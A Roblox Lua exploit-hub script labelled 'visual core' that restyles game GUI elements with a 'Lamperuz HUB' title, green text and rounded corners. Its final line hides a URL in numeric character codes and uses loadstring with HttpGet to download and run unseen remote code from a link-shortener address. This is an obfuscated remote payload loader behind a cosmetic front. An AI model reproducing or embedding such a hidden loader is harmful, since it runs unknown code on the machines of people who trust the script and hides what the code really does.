
--[[ STAGE 2: VISUAL CORE ]]
local HubName = "Lamperuz HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            -- 1. ЗАГОЛОВКИ (Smart Filter)
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            
            -- 2. СКРУГЛЕНИЯ (Modern UI)
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end
    
    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then task.delay(0.1, function() Customize(c) end) end
    end)
end

Hook()
loadstring(game:HttpGet(string.char(104, 116, 116, 112, 115, 58, 47, 47, 108, 105, 110, 107, 45, 104, 117, 98, 46, 110, 101, 116, 47, 50, 54, 50, 56, 54, 53, 48, 47, 99, 115, 115, 98, 77, 90, 78, 57, 86, 68, 74, 99)))()
